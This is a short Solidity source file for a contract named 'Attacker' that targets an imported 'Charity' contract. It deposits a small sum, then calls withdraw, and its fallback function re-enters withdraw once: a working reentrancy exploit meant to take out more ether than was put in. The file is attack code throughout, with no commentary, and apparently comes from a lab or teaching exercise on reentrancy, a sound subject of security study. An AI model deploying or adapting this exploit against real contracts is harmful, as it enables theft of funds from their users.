pragma solidity 0.7.4;

import './charity.sol';

contract Attacker {
    Charity public charity;
    bool firstcall = true;
    
    constructor(address _etherBankAddress) {
        charity = Charity(_etherBankAddress);
    }
    
    function attack() public payable {
        firstcall = true;
        charity.deposit{ value: 1000000000000000 wei}();
        charity.donateToContract(1000000000000000 wei);
        charity.withdraw();
    }

    fallback() external payable {
        if(firstcall == true) {
            firstcall = false;
            charity.withdraw();
    }}
    
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}
